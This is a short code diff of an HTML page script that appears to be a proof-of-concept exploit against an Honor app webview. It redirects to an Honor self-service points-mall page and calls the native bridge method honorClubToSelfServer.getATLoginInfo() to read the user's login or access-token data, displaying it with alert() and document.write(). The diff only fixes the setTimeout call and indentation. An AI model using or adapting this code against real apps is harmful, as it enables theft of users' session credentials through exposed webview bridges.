@@ -9,11 +9,11 @@
     </head>
     <script>
         alert("11");
-        setTimeout(getinfo(),3000);
+        setTimeout("getinfo()",3000);
         document.location.href="https://selfservice-mng-cn.hihonor.com/h5/myHonor-gray/points-mall/index.html?pageCode=pointsMain&endId=HonorClub#/exchange-records";
         function getinfo(){
         alert(honorClubToSelfServer.getATLoginInfo());
-            document.write(honorClubToSelfServer.getATLoginInfo());
+        document.write(honorClubToSelfServer.getATLoginInfo());
         }
         alert(honorClubToSelfServer.getATLoginInfo());
         document.write(honorClubToSelfServer.getATLoginInfo());
